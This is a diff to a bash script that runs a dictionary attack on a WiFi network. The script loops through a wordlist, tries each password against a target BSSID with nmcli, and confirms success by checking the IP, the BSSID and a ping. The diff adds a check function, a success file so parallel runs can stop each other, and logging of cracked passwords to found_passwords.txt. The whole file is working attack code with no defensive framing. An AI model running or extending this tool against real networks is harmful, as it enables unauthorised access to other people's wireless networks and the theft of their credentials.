@@ -8,6 +8,7 @@ GREEN='\033[0;32m'
 YELLOW='\033[1;33m'
 BLUE='\033[0;34m'
 CYAN='\033[0;36m'
+PURPLE='\033[0;35m'
 BOLD='\033[1m'
 NC='\033[0m'
 
@@ -22,12 +23,14 @@ BSSID="$1"
 WORDLIST="$2"
 INTERFACE="wlp4s0"
 ETHERNET="enp2s0"
+SUCCESS_FILE="/tmp/wifi_success_$$"
 
 cleanup() {
     echo -e "\n${YELLOW}Cleaning up...${NC}"
     ip link set "$ETHERNET" up 2>/dev/null
     nmcli device connect "$ETHERNET" 2>/dev/null
     nmcli radio wifi on
+    rm -f "$SUCCESS_FILE" 2>/dev/null
     exit 0
 }
 
@@ -62,8 +65,41 @@ echo -e "${BOLD}Wordlist:${NC}     ${CYAN}$WORDLIST${NC} (${TOTAL} passwords)"
 echo -e "${BOLD}Status:${NC}       ${YELLOW}Starting attack...${NC}"
 echo ""
 
+# Function to check connection
+check_connection() {
+    local bssid="$1"
+    
+    # Method 1: Check with iwconfig
+    CURRENT_BSSID=$(iwconfig "$INTERFACE" 2>/dev/null | grep -o "Access Point: [0-9A-F:]*" | cut -d' ' -f3)
+    
+    # Method 2: Check with nmcli
+    CONNECTION_INFO=$(nmcli -t -f GENERAL.DEVICE,GENERAL.CONNECTION,GENERAL.STATE device show "$INTERFACE" 2>/dev/null | grep -E "GENERAL.STATE" | grep "connected")
+    
+    # Method 3: Check if we have an IP
+    IP_ADDR=$(ip -4 addr show "$INTERFACE" 2>/dev/null | grep -oP '(?<=inet\s)\d+\.\d+\.\d+\.\d+' | head -1)
+    
+    # Method 4: Check connection status with iwgetid
+    CONNECTED_SSID=$(iwgetid -r "$INTERFACE" 2>/dev/null)
+    
+    if [ "$CURRENT_BSSID" = "$bssid" ] && [ -n "$IP_ADDR" ]; then
+        return 0  # Connected
+    elif [ -n "$CONNECTION_INFO" ] && [ -n "$IP_ADDR" ]; then
+        return 0  # Connected
+    elif [ -n "$CONNECTED_SSID" ] && [ -n "$IP_ADDR" ]; then
+        return 0  # Connected
+    else
+        return 1  # Not connected
+    fi
+}
+
 # Main loop
 while IFS= read -r PASSWORD || [ -n "$PASSWORD" ]; do
+    # Check if we already found the password (in case of multiple processes)
+    if [ -f "$SUCCESS_FILE" ]; then
+        echo -e "\n\n${GREEN}Password already found, stopping...${NC}"
+        break
+    fi
+    
     PASSWORD=$(echo "$PASSWORD" | tr -d '\r' | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
     [ -z "$PASSWORD" ] && continue
     
@@ -85,56 +121,95 @@ while IFS= read -r PASSWORD || [ -n "$PASSWORD" ]; do
     
     # Disconnect first
     nmcli device disconnect "$INTERFACE" &>/dev/null
-    sleep 1
+    sleep 2
     
     # Try to connect using BSSID
     nmcli device wifi connect "$BSSID" password "$PASSWORD" ifname "$INTERFACE" &>/dev/null &
     PID=$!
     
-    # Wait and check
+    # Wait and check connection with shorter intervals
     CONNECTED=false
-    for i in {1..15}; do
+    for i in {1..20}; do
         sleep 1
         
-        # Check if connected to this BSSID
-        CURRENT_BSSID=$(iwconfig "$INTERFACE" 2>/dev/null | grep -o "Access Point: [0-9A-F:]*" | cut -d' ' -f3)
-        IP_ADDR=$(ip -4 addr show "$INTERFACE" 2>/dev/null | grep -oP '(?<=inet\s)\d+\.\d+\.\d+\.\d+')
-        SIGNAL=$(iwconfig "$INTERFACE" 2>/dev/null | grep -o "Signal level=-[0-9]*" | cut -d'=' -f2)
-        
-        if [ "$CURRENT_BSSID" = "$BSSID" ] && [ -n "$IP_ADDR" ]; then
+        if check_connection "$BSSID"; then
             CONNECTED=true
-            break
+            # Get signal strength
+            SIGNAL=$(iwconfig "$INTERFACE" 2>/dev/null | grep -o "Signal level=-[0-9]*" | cut -d'=' -f2)
+            IP_ADDR=$(ip -4 addr show "$INTERFACE" 2>/dev/null | grep -oP '(?<=inet\s)\d+\.\d+\.\d+\.\d+' | head -1)
+            
+            # Create success file to signal other processes
+            echo "$PASSWORD" > "$SUCCESS_FILE"
+            break 2  # Break out of both loops
         fi
     done
     
+    # Kill the nmcli process if still running
     kill $PID 2>/dev/null
     
+    # If we found the password, break out of the main loop
     if [ "$CONNECTED" = true ]; then
-        # Clear the current line and show success message
-        echo -e "\n\n${GREEN}╔═══════════════════════ 🎉 SUCCESS 🎉 ═══════════════════════╗${NC}"
-        echo -e "${GREEN}║                                                              ║${NC}"
-        echo -e "${GREEN}║  ${BOLD}WiFi Password Found!${NC}${GREEN}                                        ║${NC}"
-        echo -e "${GREEN}║                                                              ║${NC}"
-        echo -e "${GREEN}║  ${BOLD}BSSID:${NC}      ${CYAN}$BSSID${NC}                                         ${GREEN}║${NC}"
-        echo -e "${GREEN}║  ${BOLD}Password:${NC}   ${YELLOW}${BOLD}$PASSWORD${NC}${GREEN}                                         ${GREEN}║${NC}"
-        echo -e "${GREEN}║  ${BOLD}IP Address:${NC} ${CYAN}$IP_ADDR${NC}                                         ${GREEN}║${NC}"
-        echo -e "${GREEN}║  ${BOLD}Signal:${NC}     ${CYAN}${SIGNAL} dBm${NC}                                         ${GREEN}║${NC}"
-        echo -e "${GREEN}║  ${BOLD}Attempts:${NC}   ${CYAN}$ATTEMPT/$TOTAL (${PERCENT}%)${NC}                                   ${GREEN}║${NC}"
-        echo -e "${GREEN}║                                                              ║${NC}"
-        echo -e "${GREEN}╚══════════════════════════════════════════════════════════════╝${NC}"
-        
-        # Save to file
-        echo "$BSSID:$PASSWORD" >> found_passwords.txt
-        echo -e "\n${BLUE}[+] Password saved to found_passwords.txt${NC}"
-        
-        FOUND=true
         break
     fi
     
 done < "$WORDLIST"
 
-# If not found
-if [ "$FOUND" = false ]; then
+# Check if we found the password
+if [ -f "$SUCCESS_FILE" ]; then
+    FOUND=true
+    PASSWORD=$(cat "$SUCCESS_FILE")
+    
+    # Get connection details one more time to be sure
+    IP_ADDR=$(ip -4 addr show "$INTERFACE" 2>/dev/null | grep -oP '(?<=inet\s)\d+\.\d+\.\d+\.\d+' | head -1)
+    SIGNAL=$(iwconfig "$INTERFACE" 2>/dev/null | grep -o "Signal level=-[0-9]*" | cut -d'=' -f2)
+    QUALITY=$(iwconfig "$INTERFACE" 2>/dev/null | grep -o "Link Quality=[0-9]*/[0-9]*" | cut -d'=' -f2)
+    
+    # Clear the current line and show success message
+    echo -e "\n\n${GREEN}╔═══════════════════════ 🎉 SUCCESS 🎉 ═══════════════════════╗${NC}"
+    echo -e "${GREEN}║                                                              ║${NC}"
+    echo -e "${GREEN}║  ${BOLD}WiFi Password Found!${NC}${GREEN}                                        ║${NC}"
+    echo -e "${GREEN}║                                                              ║${NC}"
+    echo -e "${GREEN}║  ${BOLD}BSSID:${NC}      ${CYAN}$BSSID${NC}                                         ${GREEN}║${NC}"
+    echo -e "${GREEN}║  ${BOLD}Password:${NC}   ${YELLOW}${BOLD}$PASSWORD${NC}${GREEN}                                         ${GREEN}║${NC}"
+    echo -e "${GREEN}║  ${BOLD}IP Address:${NC} ${CYAN}$IP_ADDR${NC}                                         ${GREEN}║${NC}"
+    
+    if [ -n "$SIGNAL" ]; then
+        echo -e "${GREEN}║  ${BOLD}Signal:${NC}     ${CYAN}${SIGNAL} dBm${NC}                                         ${GREEN}║${NC}"
+    fi
+    
+    if [ -n "$QUALITY" ]; then
+        echo -e "${GREEN}║  ${BOLD}Quality:${NC}    ${CYAN}${QUALITY}${NC}                                         ${GREEN}║${NC}"
+    fi
+    
+    echo -e "${GREEN}║  ${BOLD}Attempts:${NC}   ${CYAN}$ATTEMPT/$TOTAL (${PERCENT}%)${NC}                                   ${GREEN}║${NC}"
+    echo -e "${GREEN}║                                                              ║${NC}"
+    echo -e "${GREEN}╚══════════════════════════════════════════════════════════════╝${NC}"
+    
+    # Save to file
+    echo "$(date): $BSSID -> $PASSWORD" >> found_passwords.txt
+    echo -e "\n${BLUE}[+] Password saved to found_passwords.txt${NC}"
+    
+    # Additional verification
+    echo -e "\n${PURPLE}[*] Testing connection...${NC}"
+    if ping -c 2 -I "$INTERFACE" 8.8.8.8 &>/dev/null; then
+        echo -e "${GREEN}[✓] Internet connectivity confirmed!${NC}"
+    else
+        echo -e "${YELLOW}[!] Connected but no internet access (captive portal?)${NC}"
+    fi
+    
+    # Keep the connection alive for 30 seconds before cleanup
+    echo -e "\n${YELLOW}[*] Connection established. Press Ctrl+C to exit and cleanup.${NC}"
+    echo -e "${YELLOW}[*] Waiting 30 seconds before auto-cleanup...${NC}"
+    
+    # Wait for user input or timeout
+    for i in {30..1}; do
+        echo -ne "\r${BLUE}[*] Auto-cleanup in ${i} seconds... Press any key to exit now${NC}   "
+        read -t 1 -n 1 && break
+    done
+    echo ""
+    
+else
+    # If not found
     echo -e "\n\n${RED}╔══════════════════════════════════════════════════════════╗${NC}"
     echo -e "${RED}║                                                              ║${NC}"
     echo -e "${RED}║            ${BOLD}❌ PASSWORD NOT FOUND ❌${NC}${RED}                       ║${NC}"
@@ -149,6 +224,7 @@ echo ""
 echo -e "${YELLOW}[*] Restoring network connections...${NC}"
 ip link set "$ETHERNET" up 2>/dev/null
 nmcli device connect "$ETHERNET" 2>/dev/null
+rm -f "$SUCCESS_FILE" 2>/dev/null
 trap - SIGINT SIGTERM
 
 echo -e "${GREEN}[✓] Script completed${NC}"
